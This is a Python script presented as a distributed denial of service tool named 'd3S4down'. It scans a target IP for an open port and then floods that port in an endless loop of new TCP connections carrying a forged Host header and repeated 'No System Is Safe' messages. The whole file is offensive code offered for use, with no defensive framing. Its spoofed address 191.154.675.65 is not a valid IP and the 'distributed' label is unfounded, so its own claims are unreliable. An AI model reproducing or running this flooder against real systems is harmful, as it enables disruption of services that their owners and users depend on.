# distributed denial of service attack
import socket
import time
import random
from datetime import datetime
import os
import sys
from colorama import Fore
# start attack
# main
os.system('clear')
if len(sys.argv) == 3:
   pass
else:
   print(Fore.RED+'\n[+] Usage - ./d3S4down.py --target <ip>'+Fore.WHITE)
   exit(0)

if '--target' not in sys.argv:
   print(Fore.YELLOW+'\n[+] Option --target not supplied...'+Fore.WHITE)
   exit(0)
else:
   pass

open = []
ip = sys.argv[2] # target ip
for port in range(70, 65535):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = s.connect_ex((str(ip), port))
    if conn == 0: # if a port is opened then stop and start attack on that port
       open.append(port)
       print(Fore.BLUE+f'\n[+] Connection Succeeded On {ip}:{port} '+Fore.WHITE)
       time.sleep(2)
       break

print(Fore.YELLOW+f'\n[+] Staging Attack Started - {datetime.now()}'+Fore.WHITE)
fake_ip = '191.154.675.65'
while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((str(ip), int(open[0])))
      sock.sendto((f'Host: {fake_ip} \r\n\r\n').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      sock.sendto(('No System Is Safe').encode('ascii'), (str(ip), open[0]))
      print(Fore.GREEN+f'\n[d3S4down][+] Payload {random._urandom(10)} Sent Successfully...'+Fore.WHITE)
      time.sleep(random.uniform(0.5, 0.5))
